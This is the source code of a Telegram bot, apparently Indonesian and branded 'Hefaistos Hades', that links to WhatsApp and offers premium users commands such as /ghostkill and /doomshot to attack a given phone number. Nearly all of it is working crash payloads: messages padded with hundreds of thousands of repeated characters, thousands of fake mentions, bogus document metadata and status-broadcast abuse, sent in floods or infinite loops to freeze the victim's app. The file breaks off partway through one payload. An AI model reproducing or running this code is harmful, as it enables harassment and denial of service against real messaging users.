

//By Pria Misterius//


const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./HdsXconfig");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Zeph = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
    "https://files.catbox.moe/jzkjs2.png",
    "https://files.catbox.moe/jzkjs2.png"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const axios = require("axios");

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/bintangthemods/hahahihi/refs/heads/main/token.json"; // Ganti dengan URL GitHub yang benar

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ PENYUSUP KONTOL AWOWKWOWKWK"));
    process.exit(1);
  }

  console.log(chalk.green(` (#)TOKEN TERVERFIKASI⠀⠀`));
  startBot();
}



function startBot() {
  console.log(chalk.blue(` CAKEP! TOKEN KAMU SUDAH TERDAFTAR DI DATABASE 😍`));
}

validateToken();
// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    Zeph = makeWASocket(connectionOptions);

    Zeph.ev.on('creds.update', saveCreds);
    store.bind(Zeph.ev);

    Zeph.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭──────────────────────⟤
│  ${chalk.green.bold('WHATSAPP TERHUBUNG')}
╰──────────────────────⟤`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭──────────────────────⟤
│ ${chalk.red.bold('WHATSAPP TERPUTUS')}
╰──────────────────────⟤`),
                shouldReconnect ? chalk.white.bold(`
╭──────────────────────⟤
│ ${chalk.red.bold('HUBUNGKAN ULANG')}
╰──────────────────────⟤`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ Anda bukan owner.");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
    return;
  }
  next();
};

bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }

    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel

    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `\`\`\`
╔─═「 𝐇𝐄𝐅𝐀𝐈𝐒𝐓𝐎𝐒 𝐇𝐀𝐃𝐄𝐒 」─┓
│ ┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉〣
╠ ☐ Developer : Cosmo
╠ ☐ Version : 3.0
╠ ☐ RunTime : ${waktuRunPanel}
│ ┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉〣
╚─═─═─═─═─═─═─═─═─═─═┛
╔─═「 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐁𝐔𝐆 」─══┓
│ ┏╾╾╾╾╾╾╾╾╾╾╾╾╾╾〣
╠ ☐ /ghostkill 62xxxx
╠ ☐ /casperv2 62xxxx
╠ ☐ /invisiblev2 62xxxx
│ ┗╾╾╾╾╾╾╾╾╾╾╾╾╾╾〣
╚─═─═─═─═─═─═─═─═─═─═┛
╔─═「 𝐍𝐎 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 」─══┓
│ ┏╾╾╾╾╾╾╾╾╾╾╾╾╾╾〣
╠ ☐ /blankui 62xxxx
╠ ☐ /terminator 62xxxx
╠ ☐ /doomshot 62xxxx
│ ┗╾╾╾╾╾╾╾╾╾╾╾╾╾╾〣
╚─═─═─═─═─═─═─═─═─═─═┛
╔─═「 𝐂𝐎𝐍𝐓𝐑𝐎𝐋𝐋𝐄𝐑 」─══┓
│ ┏╾╾╾╾╾╾╾╾╾╾╾╾╾╾〣
╠ ☐ /addprem
╠ ☐ /delprem
╠ ☐ /pairing
│ ┗╾╾╾╾╾╾╾╾╾╾╾╾╾╾〣
╚─═─═─═─═─═─═─═─═─═─═┛
╔─═「 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 」─══┓
│ ┏╾╾╾╾╾╾╾╾╾╾╾╾╾╾〣
╠ ☐ Cosmo
╠ ☐ Wolf
╠ ☐ Henn
╠ ☐ Xatanical
╠ ☐ Farhost
╠ ☐ Derezyreal
╠ ☐ Marczz
╠ ☐ Kyy Asasin
╠ ☐ Ryuu
╠ ☐ All Hefaistos Hades Team
│ ┗╾╾╾╾╾╾╾╾╾╾╾╾╾╾〣
╚─═─═─═─═─═─═─═─═─═─═┛\`\`\``,
 
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.url(' 𝗢𝗪𝗡𝗘𝗥 ', 't.me/raysofhopee')]
        ])
    });
});
 
bot.command("ghostkill", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`Allright reversed by Cosmo`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 1; i++) {
      await floodStatus(24, target);
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`All right reversed by Cosmo`,{ parse_mode: "Markdown" });
});

bot.command("casperv2", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`Allright reversed by Cosmo`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    while (true){
      await btnStatus(target, true);
      await btnStatus(target, true);
      await btnStatus(target, true);
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`All right reversed by Cosmo`,{ parse_mode: "Markdown" });
});

bot.command("invisiblev2", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`Allright reversed by Cosmo`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

    while (true) {
      await multiResponse(target, true);
      await multiResponse(target, true);
      await multiResponse(target, true);
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`All right reversed by Cosmo`,{ parse_mode: "Markdown" });
});

bot.command("terminator", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`Process Sending Bug..`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 
  
    for (let i = 0; i < 100; i++) {
    await Joox(target);
    await killui(target, Ptcp = true);
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`Allright reversed by Cosmo`,{ parse_mode: "Markdown" });
});

bot.command("blankui", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`Wait proses lek`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 
  
    for (let i = 0; i < 100; i++) {
    await killui(target, Ptcp = true);
    await LalaDoct(target);
    await Ragnarokz(target);
    await UIXFC(target);
    await LocaBugs(target);
    await DocBug(target);
    await NotifKill(target);
    await DocSystem2(target);
    await DocSystem3(target);
    
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`Allright reversed by Cosmo`,{ parse_mode: "Markdown" });
});

bot.command("doomshot", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`Process Sending Bug...`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 
  
    for (let i = 0; i < 200; i++) {
    await LocaBugs(target);
    await killui(target, Ptcp = true);
    await UIXFC(target);
    await VampDelayCrash(target);
    }
    
// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`Allright reversed by Cosmo`,{ parse_mode: "Markdown" });
});

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("pairing", checkOwner, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /pairing <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Zeph && Zeph.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await Zeph.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
𝗞𝗼𝗱𝗲: ${formattedCode}
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};



// Command untuk restart
bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});
  
//==========( invis)
async function btnStatus(target, mention) {
let pesan = await generateWAMessageFromContent(target, {
buttonsMessage: {
text: "🔥",
contentText: "Cosmo#",
footerText: "maklo",
buttons: [
{ buttonId: ".glitch", buttonText: { displayText: "⚡" + "\u0000".repeat(400000) }, type: 1 }
],
headerType: 1
}
}, {});

await Zeph.relayMessage("status@broadcast", pesan.message, {
messageId: pesan.key.id,
statusJidList: [target],
additionalNodes: [
{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }
]
});

if (mention) {
await Zeph.relayMessage(target, {
groupStatusMentionMessage: {
message: { protocolMessage: { key: pesan.key, type: 25 } }
}
}, {
additionalNodes: [
{ tag: "meta", attrs: { is_status_mention: "P𝗿𝗼𝘁𝗼𝗰𝗼𝗹" }, content: undefined }
]
});
}
}

async function floodStatus(duration, target) {
const totalDuration = duration * 60 * 60 * 1000;
const startTime = Date.now();
let amount = 0;

const nextMessage = async () => {
if (Date.now() - startTime >= totalDuration) {
console.log(`Berhenti setelah ${amount} pesan`);
return;
}

if (amount < 600) {
await btnStatus(target, false);
await btnStatus(target, true);
amount++;
console.log(chalk.red(`Invis Cosmo ${amount}/600 ke ${target}`));
nextMessage();
} else {
console.log(chalk.green(`Berhasil Mengirim 600 Status Bug ke ${target}`));
amount = 0;
console.log(chalk.red("Melanjutkan 600 Status Bug berikutnya"));
setTimeout(nextMessage, 5000);
}
};

nextMessage();
}

async function multiResponse(target, stats) {
    const overButton = Array.from({ length: 9696 }, (_, r) => ({
        title: "᭄".repeat(9696),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }))

    const gluncherOfDelay = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Hai",
                    listType: 2,
                    buttonText: null,
                    sections: overButton,
                    singleSelectReply: { selectedRowId: "🪅" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9696 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: formatedNumber,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9696,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9696@newsletter",
                            serverMessageId: 1,
                            newsletterName: "----default"
                        }
                    },
                    description: "default"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    }

    const delayInstantStatus = generateWAMessageFromContent(formatedNumber, gluncherOfDelay, {})

    await Zeph.relayMessage("status@broadcast", delayInstantStatus.message, {
        messageId: delayInstantStatus.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    })

    if (stats) {
        await Zeph.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: delayInstantStatus.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "hello" },
                        content: undefined
                    }
                ]
            }
        )
    }
}
  
// ========================= [ CRASH FUNCT ] =========================
async function killui(target, Ptcp = true) {
      await Zeph.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: 'https://files.catbox.moe/mgnwmg.jpg',
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "饝箔饝箔饾棩饾棶饾棿饾\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: [target, "6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

async function protocolbug(isTarget, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@delaydek",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: isTarget,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(isTarget, MSG, {});

await Zeph.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await Zeph.relayMessage(
isTarget,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 𝗧𝗮𝗺𝗮 - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
content: undefined
}
]
}
);
}
}
async function NotifKill(target) {
      Zeph.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "𝗛𝗲𝗳𝗮𝗶𝘀𝘁𝗼𝘀𝗛𝗮𝗱𝗲𝘀.𝗰𝗼𝗺" + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝗖𝗼𝘀𝗺𝗼.𝗰𝗹𝗼𝘂𝗱.𝗻𝗲𝘁" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
async function DocBug(target) {
 let virtex = "(🦂) 𝗛𝗮𝗱𝗲𝘀𝗛𝗲𝗳𝗮𝗶𝘀𝘁𝗼𝘀";
   Zeph.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𝗙𝘂𝗰𝗸𝗬𝗼𝘂 𝗛𝗮𝗱𝗲𝘀" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝗖𝗼𝘀𝗺𝗼𝗢𝗹𝗮" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function LocaBugs(target) {
 await Zeph.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: '𝗛𝗮𝗱𝗲𝘀 𝗵𝗲𝗿𝗲...'+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "饝箔饝箔饾棩饾棶饾棿饾" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function VampDelayCrash(target) {
    const Vampire = "_*~@15056662003~*_\n".repeat(10200);
    const Lalapo = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐀𝐧𝐚𝐤 𝐇𝐚𝐬𝐢𝐥 𝐋𝐨𝐧𝐭𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝗛𝗲𝗳𝗮.Clouds" + Lalapo + Vampire
                    },
                    contextInfo: {
                        mentionedJid: [target, "15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 999,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
